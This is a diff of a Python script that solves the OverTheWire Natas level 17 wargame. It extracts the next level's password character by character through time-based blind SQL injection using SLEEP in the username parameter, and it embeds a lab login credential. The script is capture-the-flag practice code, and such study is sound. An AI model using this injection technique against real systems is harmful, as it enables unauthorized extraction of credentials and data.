@@ -1,33 +1,48 @@
 import requests
 import string
+import time
 
 url = "http://natas17.natas.labs.overthewire.org"
-auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
+auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
+
+# session reuse = huge speed boost
+session = requests.Session()
+session.auth = auth
 
 chars = string.ascii_letters + string.digits
 password = ""
+
+THRESHOLD = 4  # adjust if needed
 
 while True:
     found = False
 
     for c in chars:
         attempt = password + c
-        # This works only if there is one relevent passowrd. i dont know the username, i assumed it was natas18 but its wrong i assume.
-        # I tried to spesifically ask for natas18 but it didnt work, so i just left it as like that and it worked.
+
         payload = f'natas18" AND password LIKE BINARY "{attempt}%" AND SLEEP(5) -- -'
-        response = requests.get(url, params={"username": payload}, auth=auth)
-        elapsed_time = response.elapsed
-        time_in_seconds = elapsed_time.total_seconds()
 
-        print(f"Trying: {attempt} | Time: {time_in_seconds}")
+        start = time.perf_counter()
 
-        # 👇 adjust threshold based on your observations
-        if time_in_seconds > 4:
+        try:
+            session.get(
+                url,
+                params={"username": payload},
+                timeout=10
+            )
+        except requests.exceptions.RequestException:
+            continue
+
+        elapsed = time.perf_counter() - start
+
+        print(f"Trying: {attempt} | {elapsed:.2f}s")
+
+        if elapsed > THRESHOLD:
             password += c
-            print(f"[+] Found: {password}")
+            print(f"[+] Found so far: {password}")
             found = True
             break
 
     if not found:
-        print(f"[✓] Password: {password}")
+        print(f"[✓] Final password: {password}")
         break
